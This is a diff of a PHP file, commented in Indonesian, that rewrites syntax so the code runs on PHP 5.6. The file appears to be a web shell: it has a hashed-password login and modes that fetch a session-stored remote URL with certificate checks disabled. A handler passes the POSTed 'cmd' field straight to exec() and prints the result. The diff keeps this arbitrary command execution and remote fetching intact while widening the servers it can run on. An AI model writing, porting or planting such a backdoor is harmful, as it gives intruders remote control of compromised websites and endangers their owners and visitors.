@@ -4,17 +4,22 @@ $LOGIN_PASSWORD_HASH  = '$2y$10$HFx7rStVQKzp6r82PNZwxOzzI.FP8y8KJBx7Sd58fPtDl5PH
 
 session_start();
 
-$mode = $_GET['mode'] ?? $_POST['mode'] ?? '';
+// GANTI ini agar kompatibel PHP 5.6 (hapus ??)
+$mode = '';
+if (isset($_GET['mode'])) {
+    $mode = $_GET['mode'];
+} elseif (isset($_POST['mode'])) {
+    $mode = $_POST['mode'];
+}
 
 if ($mode === 'amw') {
     if (isset($_SESSION['ready']) && isset($_SESSION['go']) && $_SESSION['go'] == 1 && !empty($_SESSION['URL'])) {
         $c = curl_init($_SESSION['URL']);
-        curl_setopt_array($c, [
-            CURLOPT_RETURNTRANSFER => 1,
-            CURLOPT_FOLLOWLOCATION => 1,
-            CURLOPT_SSL_VERIFYPEER => 0,
-            CURLOPT_TIMEOUT => 15
-        ]);
+        // GANTI curl_setopt_array -> curl_setopt berulang (lebih aman PHP 5.6)
+        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($c, CURLOPT_TIMEOUT, 15);
         $x = curl_exec($c);
         $e = curl_error($c);
         curl_close($c);
@@ -33,12 +38,10 @@ if ($mode === 'amw') {
 } elseif ($mode === 'automatic') {
     if (!empty($_SESSION['URL'])) {
         $c = curl_init($_SESSION['URL']);
-        curl_setopt_array($c, [
-            CURLOPT_RETURNTRANSFER => 1,
-            CURLOPT_FOLLOWLOCATION => 1,
-            CURLOPT_SSL_VERIFYPEER => 0,
-            CURLOPT_TIMEOUT => 15
-        ]);
+        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($c, CURLOPT_TIMEOUT, 15);
         $x = curl_exec($c);
         $e = curl_error($c);
         curl_close($c);
@@ -139,7 +142,7 @@ if (!empty($_POST['cmd'])) {
     echo "<pre>";
     echo "<b>Command:</b> " . htmlspecialchars($_POST['cmd']) . "\n\n";
     echo "<b>Result:</b>\n";
-    $output = []; $retval = 0;
+    $output = array(); $retval = 0;
     exec($_POST['cmd'], $output, $retval);
     echo htmlspecialchars(implode("\n", $output));
     echo "\n\n<b>Return Code:</b> $retval";
